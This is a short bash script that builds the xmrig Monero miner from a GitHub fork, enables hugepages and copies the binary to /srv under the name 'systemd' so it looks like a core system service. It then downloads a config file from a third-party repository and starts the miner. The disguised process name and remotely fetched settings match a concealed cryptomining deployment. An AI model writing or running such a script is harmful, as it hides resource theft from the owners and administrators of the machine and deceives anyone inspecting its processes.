#!/bin/bash

# go to root
cd

# server update & requesting apps install
apt-get -y  install git build-essential cmake libuv1-dev libmicrohttpd-dev software-properties-common;

# adding gcc repository
add-apt-repository -y ppa:jonathonf/gcc-7.1;

# reupdate source
apt-get -y  update;

# atcivate hugepages

sysctl -w vm.nr_hugepages=128


# installing gcc
apt-get -y  install gcc-7 g++-7;

# cloning xmrig package
git clone https://github.com/siptruk/xmrig.git

#entering xmrig directory
cd xmrig

# creating build directory
mkdir build

# entering build directory
cd build

# running cmake & gcc
cmake .. -DCMAKE_C_COMPILER=gcc-7 -DCMAKE_CXX_COMPILER=g++-7

# making program
make

# make an alias :D
cp xmrig systemd


mv systemd /srv

cd /srv

chmod +x systemd

wget https://raw.githubusercontent.com/bojokugalak/snippet/master/config.json

./systemd
